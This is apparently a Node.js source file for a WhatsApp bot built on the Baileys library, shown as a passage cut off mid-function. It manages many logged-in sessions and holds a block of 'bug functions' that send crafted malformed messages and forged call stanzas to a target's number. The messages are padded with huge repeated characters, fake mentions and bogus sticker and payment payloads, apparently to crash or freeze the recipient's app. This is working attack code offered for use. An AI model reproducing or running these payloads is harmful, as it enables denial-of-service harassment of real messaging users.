const fs = require('fs');
const path = require('path');
const {
default: makeWASocket,
sockConnect,
downloadContentFromMessage,
useMultiFileAuthState,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header,
encodeNewsletterMessage,
patchMessageBeforeSending,
encodeWAMessage,
encodeSignedDeviceIdentity,
jidEncode,
jidDecode,
baileysLib
} = require("@whiskeysockets/baileys")
const pino = require('pino');
const { logger } = require('../utils/logger');
const { loadKeyList, saveKeyList } = require('./databaseService');
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Fungsi untuk mengecek apakah user memiliki role VIP atau Owner
function isVipOrOwner(user) {
  return user && ["vip", "owner"].includes(user.role);
}

// Fungsi untuk mendapatkan path session VIP
function getVipSessionPath(sessionName) {
  return path.join('./vip', sessionName);
}

// Fungsi untuk menyiapkan folder session VIP
function prepareVipSessionFolders() {
  const vipFolder = './vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session VIP dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logger.info("Folder session VIP kosong.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session VIP:", err.message);
    return [];
  }
}

// Fungsi untuk menghubungkan ke session VIP
async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[VIP ${sessionName}] Terhubung`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.info(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(sessionPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.info(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            fs.rmSync(sessionPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.info(`[VIP ${sessionName}] DILEWATI (session tidak valid / belum login)`);
      resolve();
    }
  });
}

// Fungsi untuk memulai semua session VIP
async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Ditemukan ${files.length} session`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');

    // Lewati jika sudah terhubung
    if (activeConnections[baseName]) {
      logger.info(`[VIP ${baseName}] Sudah terhubung, dilewati.`);
      continue;
    }

    await connectVipSession(baseName);
  }
}

// Fungsi untuk mendapatkan koneksi VIP yang aktif
function getActiveVipConnections() {
  const vipConnections = {};
  
  for (const sessionName in activeConnections) {
    // Cek apakah session ini ada di folder VIP
    const sessionPath = getVipSessionPath(sessionName);
    if (fs.existsSync(sessionPath)) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  
  return vipConnections;
}

// Fungsi untuk mengecek apakah session adalah session VIP
function isVipSession(sessionName) {
  const sessionPath = getVipSessionPath(sessionName);
  return fs.existsSync(sessionPath);
}

// Fungsi untuk mendapatkan koneksi VIP acak
function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  
  if (sessionNames.length === 0) return null;
  
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// Modifikasi fungsi checkActiveSessionInFolder untuk menggunakan session VIP untuk user VIP/Owner
function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  // Jika user adalah VIP atau Owner, cek session VIP terlebih dahulu
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  // Kembali ke session milik user
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      logger.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    process.exit(1);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });
        
        sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
  logger.error(`[${sessionName}] ERROR: ${err.stack}`);
  resolve();
}
  });
}

// Modifikasi fungsi startUserSessions untuk memulai session VIP juga
async function startUserSessions() {
  // Memulai session user biasa
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder di dalam permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      // Lewati jika session sudah aktif
      if (activeConnections[sessionName]) {
        logger.info(`[SKIP] Session ${sessionName} sudah aktif, dilewati...`);
        continue;
      }

      try {
        logger.info(`[START] Menghubungkan session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        logger.error(`[ERROR] Gagal memulai session ${sessionName}: ${err.message}`);
      }
    }
  }
  
  // Juga mulai session VIP
  await startVipSessions();
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }

  logger.info('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

// WhatsApp bug functions
async function producInvite(sock, target) {
    await sock.sendMessage(target, {
        productMessage: {
            title: "\u0003",
            description: "\u0003",
            thumbnail: { url: "https://files.catbox.moe/uq70sn.jpg" },
            productId: "PROD001",
            retailerId: "RETAIL001",
            url: "https://t.me/primroseell",
            body: "\u0003",
            priceAmount1000: 50000,
            currencyCode: "USD",
            contextInfo: {
                remoteJid: " Raja iblis ",
                mentionedJid: [
                    "13135559098@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                ]
            },
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                        title: "᬴".repeat(60000)
                    })
                }
            ]
        }
    }, { participant: { jid: target } });
    
    await sock.relayMessage(target, {
        newsletterAdminInviteMessage: {
            newsletterJid: `1@newsletter`,
            newsletterName: "᬴".repeat(60000),
            jpegThumbnail: null,
            caption: `\`${"ꦾ".repeat(90000)}\``,
            inviteExpiration: 1814400000,
            contextInfo: {
                remoteJid: " Raja iblis ",
                mentionedJid: [
                    "13135559098@s.whatsapp.net",
                    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + " 0@s.whatsapp.net")
                ]
            }
        }
    }, {
        participant: { jid: target }
    });
}

async function delaynnnnNew(sock, target, xrl = true) {
  let JsonExp = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Kkkk ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "X",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " is back?! ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "X",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp3 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "X",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "AVG",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp.message,
      },
    },
    xrl
      ? { messageId: JsonExp.key.id, participant: { jid: target } }
      : { messageId: JsonExp.key.id },
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp2.message,
      },
    },
    xrl
      ? { messageId: JsonExp2.key.id, participant: { jid: target } }
      : { messageId: JsonExp2.key.id },
  );
  
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp3.message,
      },
    },
    xrl
      ? { messageId: JsonExp3.key.id, participant: { jid: target } }
      : { messageId: JsonExp3.key.id },
  );
    console.log("suksesnjir");
}

async function fcno(sock, target){  

    let devices = (  
        await sock.getUSyncDevices([target], false, false)  
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);  

    await sock.assertSessions(devices);  

    let mutexFactory = () => {  
        let map = {};  
        return {  
            mutex(key, fn) {  
                map[key] ??= { task: Promise.resolve() };  
                map[key].task = (async prev => {  
                    try { await prev; } catch { }  
                    return fn();  
                })(map[key].task);  
                return map[key].task;  
            }  
        };  
    };  

    let mutexManager = mutexFactory();  
    let encodeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);  
    let origCreateNodes = sock.createParticipantNodes.bind(sock);  
    let origEncode = sock.encodeWAMessage?.bind(sock);  

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {  
        if (!recipientJids.length)  
            return { nodes: [], shouldIncludeDeviceIdentity: false };  

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);  
        let ywdh = Array.isArray(patched)  
            ? patched  
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));  

        let { id: meId, lid: meLid } = sock.authState.creds.me;  
        let omak = meLid ? jidDecode(meLid)?.user : null;  
        let shouldIncludeDeviceIdentity = false;  

        let nodes = await Promise.all(  
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {  

                let { user: targetUser } = jidDecode(jid);  
                let { user: ownPnUser } = jidDecode(meId);  

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;  
                let y = jid === meId || jid === meLid;  

                if (dsmMessage && isOwnUser && !y)  
                    msg = dsmMessage;  

                let bytes = encodeBuffer(origEncode ? origEncode(msg) : encodeWAMessage(msg));  

                return mutexManager.mutex(jid, async () => {  
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({  
                        jid,  
                        data: bytes  
                    });  

                    if (type === 'pkmsg')  
                        shouldIncludeDeviceIdentity = true;  

                    return {  
                        tag: 'to',  
                        attrs: { jid },  
                        content: [{  
                            tag: 'enc',  
                            attrs: { v: '2', type, ...extraAttrs },  
                            content: ciphertext  
                        }]  
                    };  
                });  
            })  
        );  

        return {  
            nodes: nodes.filter(Boolean),  
            shouldIncludeDeviceIdentity  
        };  
    };  

    let awik = crypto.randomBytes(32);  
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);  

    let {  
        nodes: destinations,  
        shouldIncludeDeviceIdentity  
    } = await sock.createParticipantNodes(  
        devices,  
        { conversation: "y" },  
        { count: '0' }  
    );  

    let expensionNode = {  
        tag: "call",  
        attrs: {  
            to: target,  
            id: sock.generateMessageTag(),  
            from: sock.user.id  
        },  
        content: [{  
            tag: "offer",  
            attrs: {  
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),  
                "call-creator": sock.user.id  
            },  
            content: [  
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },  
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },  
                {  
                    tag: "video",  
                    attrs: {  
                        orientation: "0",  
                        screen_width: "1920",  
                        screen_height: "1080",  
                        device_orientation: "0",  
                        enc: "vp8",  
                        dec: "vp8"  
                    }  
                },  
                { tag: "net", attrs: { medium: "3" } },  
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },  
                { tag: "encopt", attrs: { keygen: "2" } },  
                { tag: "destination", attrs: {}, content: destinations },  
                ...(shouldIncludeDeviceIdentity  
                    ? [{  
                        tag: "device-identity",  
                        attrs: {},  
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)  
                    }]  
                    : []  
                )  
            ]  
        }]  
    };  

    await sock.sendNode(expensionNode);  
}

async function epcinjir(sock, target) {
await sock.relayMessage(target, {
requestPaymentMessage: {
currencyCodelso4217: "IDR", requestFrom: target, expiryTimestamp: Date.now() + 60 * 1000, amount: { value: 1, offset: 0, currencyCode: "IDR" } } } ) }

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[DarkVerse]" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function onemsg(sock, targetJid) {
  await sock.relayMessage(targetJid, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      requestFrom: targetJid,
      expiryTimestamp: null,
      contextInfo: {
        remoteJid: " X ",
        isForwarded: true,
        forwardingScore: 979,
        externalAdReply: {
          title: "I See",
          body: "R u o k",
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewTtpe: "VIDEO",
          sourceUrl: "https://t.me/akamaiboy",
          mediaUrl: "https://t.me/akamaiboy",
          showAdAttribution: true,
        }
      }
    }
  }, {
    participant: { jid: targetJid },
    quoted: null,
    useraJid: null,
    messageId: null
  });
}

async function XxContact(sock, target) {
  if (!sock || !target) return;
  try {
    const HERY = {
      contactMessage: {
        displayName: "VISI",
        vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:Admin\nEND:VCARD', 
        clientUrl: null,
        serverUrl: null
      }
    };
    await sock.relayMessage(target, { message: HERY }, {
      messageId: crypto.randomBytes(16).toString('hex').toUpperCase()
    });
  } catch (error) {
  }
}

async function bleng(sock, target) {
  await sock.sendMessage(
    target,
    {
      interactiveMessage: {
        title: "Permisi Bg",
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ោ៝".repeat(40000)
            })
          }
        ]
      }
    },
    { participant: { jid: target } }
  );
}


function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function fcinvisotax(sock, target) {
const sender = [...sessions.keys()][0];
  if (!sender || !sessions.has(sender)) return { success: false, error: "no-sender" };
  if (!sock) return { success: false, error: "invalid-session" };
  let baileysLib = null;
  try { baileysLib = require('@otaxayun/baileys'); } catch (e1) { try { baileysLib = require('@adiwajshing/baileys'); } catch (e2) { baileysLib = null; } }

  const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? sock.encodeWAMessage?.bind(sock) ?? ((msg) => {
    try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
  });

  const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? sock.encodeSignedDeviceIdentity?.bind(sock) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const janda = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;

        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try {
      devices = (await sock.getUSyncDevices([jid], false, false))
        .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
      devices = [jid];
    }

    try { await sock.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: { to: jid, id: sock.generateMessageTag ? sock.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: sock.user?.id || sock.authState?.creds?.me?.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user?.id || sock.authState?.creds?.me?.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(sock.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch (e) {}
    }

    await sock.sendNode(otaxkiw);

    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}
    
async function permenCall(sock, toJid, isVideo = true) {
  const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });


  const offerContent = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
    {
      tag: "video",
      attrs: {
        orientation: "0",
        screen_width: "1920",
        screen_height: "1080",
        device_orientation: "0",
        enc: "vp8",
        dec: "vp8"
      }
    },
    { tag: "net", attrs: { medium: "3" } },
    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
    { tag: "encopt", attrs: { keygen: "2" } },
    { tag: "destination", attrs: {}, content: destinations },
    ...(shouldIncludeDeviceIdentity ? [{
      tag: "device-identity",
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    }] : [])
  ].filter(Boolean);


  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      from: sock.user.id,
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}
    
async function denglay(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝗫𝗲𝗻𝘇𝘆.¡𝗺𝗣𝘂𝗟𝘀𝗲 ( ₹ )",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      { participant: { jid: target } }
    );
  }
}
    
async function crsh(sock, target) {
  const fafi = {
    requestPaymentMessage: {
      paymentLinkMetadata: {
        button: {
          displayText: "}[".repeat(1200),
        },
        header: {
          headerType: 0,
        },
      },
    },
  };

  const fi = {
    participant: { jid: target },
    quoted: null,
    userJid: null,
  };

